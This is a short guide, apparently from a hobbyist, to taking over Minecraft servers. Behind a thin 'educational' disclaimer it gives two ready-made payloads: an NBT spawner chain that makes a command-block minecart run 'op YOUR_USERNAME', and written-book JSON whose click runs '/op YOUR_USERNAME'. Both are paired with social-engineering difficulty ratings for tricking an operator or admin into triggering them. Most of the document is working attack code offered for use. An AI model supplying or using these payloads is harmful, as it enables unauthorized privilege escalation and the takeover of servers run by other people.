# Server Takeover
This guide will show you exploits, methods, and social engineering tactics to take over a Minecraft server *for educational preproduces*

_______________
# Methods

## Written NBT (Ran by OP / Sys Admin)
*Please replace `YOUR_USERNAME` with your Minecraft IGN*

Villager -> OP, requires: `CREATIVE` + `Command Blocks Enabled`, SE Dif: Easy
```json
{EntityTag:{id:"minecraft:falling_block",BlockState:{Name:"minecraft:spawner"},TileEntityData:{SpawnCount:20,SpawnRange:10,Delay:1,MinSpawnDelay:100,MaxSpawnDelay:100,SpawnData:{id:"minecraft:villager",NoAI:1b,Health:1f,Passengers:[{id:"minecraft:falling_block",BlockState:{Name:"minecraft:redstone_block"},Time:1,Passengers:[{id:"minecraft:fox",NoAI:1b,Health:1f,Passengers:[{id:"minecraft:falling_block",BlockState:{Name:"minecraft:activator_rail"},Time:1,Passengers:[{id:"minecraft:command_block_minecart",Command:"execute as @e run op YOUR_USERNAME"}]}],ActiveEffects:[{Id:20b,Amplifier:4b,Duration:1000}]}]}],ActiveEffects:[{Id:20b,Amplifier:4b,Duration:1000}]}},Time:1}}
```
______________
Written Book -> OP, requires: `CREATIVE`, SE Dif: Medium
```json
{
    "text": "Flip the page", 
    "clickEvent": {
       "action": "run_command",
       "value": "/op YOUR_USERNAME"
    }
}
```
